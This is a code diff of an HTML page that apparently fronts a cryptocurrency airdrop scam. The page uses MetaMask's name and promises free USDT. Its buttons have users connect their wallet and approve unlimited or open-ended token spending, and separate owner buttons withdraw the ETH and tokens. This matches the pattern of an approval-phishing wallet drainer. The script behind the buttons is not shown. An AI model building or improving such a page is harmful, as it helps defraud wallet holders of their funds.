@@ -3,31 +3,42 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Exclusive Airdrop Opportunity</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="styles.css">
+  <title>MetaMask Airdrop</title>
+  <style>
+    /* Simple styling for buttons */
+    button {
+      padding: 10px 20px;
+      margin: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    #approveButton, #claimAirdropButton {
+      background-color: orange;
+    }
+    #connectButton {
+      background-color: #4CAF50;
+      color: white;
+    }
+    #withdrawETHButton, #withdrawTokensButton {
+      background-color: #f44336;
+      color: white;
+    }
+  </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎉 Exclusive USDT Airdrop Just For You! 🎉</h1>
-    <h2>Claim your rewards today and start your journey to success!</h2>
-    <button id="connectButton" class="btn">Connect to MetaMask</button>
-    <button id="approveButton" class="btn" disabled>Approve Unlimited USDT Drops</button>
-    <div class="claim-btn-container">
-      <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
-      <div id="processingMessage" class="processing">Processing...</div>
-    </div>
-    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
-      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
-      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
-    </div>
-    <div class="footer">
-      <p>By participating, you agree to our <a href="#">Terms & Conditions</a>.</p>
-      <p>Need help? <a href="#">Contact Us</a></p>
-    </div>
-  </div>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
-  <script src="script.js" defer></script>
+
+  <h1>MetaMask Airdrop</h1>
+  
+  <!-- Buttons for actions -->
+  <button id="connectButton">Connect MetaMask</button>
+  <button id="approveButton" disabled>Approve Spending</button>
+  <button id="claimAirdropButton" disabled>Claim Airdrop</button>
+  <button id="withdrawETHButton">Withdraw ETH</button>
+  <button id="withdrawTokensButton">Withdraw Tokens</button>
+
+  <!-- Script loading -->
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <script src="app.js"></script> <!-- Your JavaScript file -->
 </body>
 </html>
 
